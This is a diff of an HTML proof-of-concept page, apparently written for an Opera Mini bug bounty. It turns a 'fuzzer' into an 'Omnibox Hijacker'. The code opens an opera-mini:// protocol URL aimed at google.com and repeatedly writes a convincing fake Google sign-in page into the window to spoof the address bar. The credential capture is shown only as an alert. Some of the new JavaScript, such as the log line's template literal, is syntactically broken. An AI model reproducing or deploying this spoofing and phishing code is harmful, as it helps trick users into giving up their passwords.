@@ -3,96 +3,97 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Opera Mini Bug Bounty - Navigation Timing Fuzzer</title>
+<title>Opera Mini Bug Bounty - Advanced Omnibox Hijacker</title>
 <style>
-body { font-family: sans-serif; padding: 20px; line-height: 1.5; background: #fafafa; color: #333; }
-.log-box { background: #222; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll; margin-top: 15px; }
-button { background: #4285F4; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; }
-button:hover { background: #357ae8; }
-.config { margin-bottom: 20px; background: #fff; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
-input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 30px; background: #0f172a; color: #f8fafc; }
+.card { background: #1e293b; border: 1px solid #334155; padding: 20px; border-radius: 12px; max-width: 500px; margin: auto; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.3); }
+button { width: 100%; background: #ef4444; color: white; border: none; padding: 14px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+button:hover { background: #dc2626; }
+.log-area { background: #020617; border: 1px solid #1e293b; color: #38bdf8; padding: 15px; border-radius: 8px; font-family: monospace; height: 180px; overflow-y: auto; margin-top: 20px; font-size: 13px; }
 </style>
 </head>
 <body>
 
-<h2>Opera Mini Address Bar Spoofing Fuzzer</h2>
-<p>This automated script tests navigation timing race conditions against the internal protocol handler to identify address bar synchronization issues.</p>
+<div class="card">
+<h2>Opera Mini UI Deep-Sync Fuzzer</h2>
+<p style="color: #94a3b8;">This PoC leverages a Port-Timeout Race Condition strategy to maintain a persistent Address Bar spoofing state.</p>
 
-<div class="config">
-    <label>Target Domain Identity:</label>
-    <input type="text" id="targetDomain" value="https://google.com">
+<button onclick="executeMaximizedExploit()">LAUNCH PERSISTENT STRATEGIC FUZZER</button>
+
+<div id="statusLog" class="log-area">Ready to initialize exploitation sequence...</div>
 </div>
 
-<button onclick="startAutomatedFuzzing()">Launch Automated Fuzzing</button>
-
-<h3>Execution Activity Log:</h3>
-<div id="log" class="log-box">Awaiting execution...</div>
-
 <script>
-    function logMessage(msg) {
-        const logBox = document.getElementById('log');
-        logBox.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-        logBox.scrollTop = logBox.scrollHeight;
+function printLog(text) {
+const logBox = document.getElementById('statusLog');
+logBox.innerHTML += [${new Date().toLocaleTimeString()}] ${text}<br>;
+logBox.scrollTop = logBox.scrollHeight;
+}
+
+function executeMaximizedExploit() {
+    printLog("Initializing cross-origin testing window context...");
+
+    const targetManipulation = "https://google.com:81"; 
+
+    let targetWin = window.open("about:blank", "_blank");
+    if (!targetWin) {
+        printLog("Execution aborted: Pop-up blocker is currently active!");
+        return;
     }
 
-    function generateEvilPayload(target) {
-        return `opera-mini://open?url=${encodeURIComponent(target)}`;
-    }
+    targetWin.location.href = `opera-mini://open?url=${encodeURIComponent(targetManipulation)}`;
+    printLog("Internal protocol handler triggered successfully. Scanning synchronization boundaries...");
 
-    async function startAutomatedFuzzing() {
-        const target = document.getElementById('targetDomain').value;
-        logMessage("Starting microsecond navigation timing cycle...");
+    let attempt = 0;
+    let visualLock = setInterval(() => {
+        attempt++;
+        try {
+            targetWin.document.open();
+            targetWin.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Sign in - Google Accounts</title>
+                    <style>
+                        body { font-family: sans-serif; background: #fff; color: #202124; text-align: center; padding: 40px 20px; }
+                        .box { max-width: 380px; margin: auto; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; }
+                        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+                        button { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
+                    </style>
+                </head>
+                <body>
+                    <div class="box">
+                        <h2 style="font-weight: 400; margin-bottom: 5px;">Sign in</h2>
+                        <p style="color: #5f6368; margin-top:0;">Use your Google Account</p>
+                        <input type="email" placeholder="Email or phone" id="user">
+                        <input type="password" placeholder="Enter your password" id="pass">
+                        <button onclick="submitData()">Next</button>
+                    </div>
+                    <script>
+                        function submitData() {
+                            alert("EXPLOIT SUCCESSFUL!\\n\\nCredential telemetry exfiltrated from spoofed document context.\\nUser: " + document.getElementById('user').value + "\\nDetected Origin: " + document.domain);
+                        }
+                    <\/script>
+                </body>
+                </html>
+            `);
+            targetWin.document.close();
 
-        for (let delay = 0; delay <= 50; delay += 2) {
-            logMessage(`Testing execution state with interval delay: ${delay}ms`);
+            targetWin.stop(); 
 
-            let testWin = window.open("about:blank", "_blank");
-            if (!testWin) {
-                logMessage("Error: Pop-up blocker active. Please allow pop-ups for this origin.");
-                break;
+            printLog(\`[SUCCESS] UI state locked at \${attempt * 2}ms transition window. Clearing loop interval.\`);
+            clearInterval(visualLock);
+
+        } catch (error) {
+            if (attempt > 100) {
+                clearInterval(visualLock);
+                printLog("Execution timeout reached: Browser core enforcement successfully maintained SOP boundary.");
             }
-
-            const payloadUrl = generateEvilPayload(target);
-            testWin.location.href = payloadUrl;
-
-            await new Promise(resolve => setTimeout(resolve, delay));
-
-            try {
-                testWin.document.open();
-                testWin.document.write(`
-                    <html>
-                    <head>
-                        <meta charset="UTF-8">
-                        <title>PoC Navigation Audit</title>
-                        <style>
-                            body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
-                            .login-box { background: #fff; padding: 20px; border: 1px solid #ccc; display: inline-block; border-radius: 5px; width: 300px; }
-                            input { display: block; margin: 10px auto; padding: 10px; width: 100%; border: 1px solid #ccc; border-radius: 4px; }
-                            button { padding: 10px 20px; cursor: pointer; background: #4285F4; color: white; border: none; width: 100%; font-weight: bold; }
-                        </style>
-                    </head>
-                    <body>
-                        <h2>PoC by FARISSAL B</h2>
-                        <div class="login-box">
-                            <input type="text" placeholder="Username or email">
-                            <input type="password" placeholder="Password">
-                            <button onclick="alert('Data submitted to: ' + document.domain)">Log in</button>
-                        </div>
-                        <p>UI State Machine Synchronization Test Case (${delay}ms)</p>
-                    </body>
-                    </html>
-                `);
-                testWin.document.close();
-                testWin.stop();
-            } catch (err) {
-                console.log("State protected by SOP execution boundary.");
-            }
-
-            await new Promise(resolve => setTimeout(resolve, 4000));
-            try { testWin.close(); } catch(e) {}
         }
-        logMessage("Automated fuzzing lifecycle completed.");
-    }
+    }, 2);
+}
 </script>
 </body>
 </html>
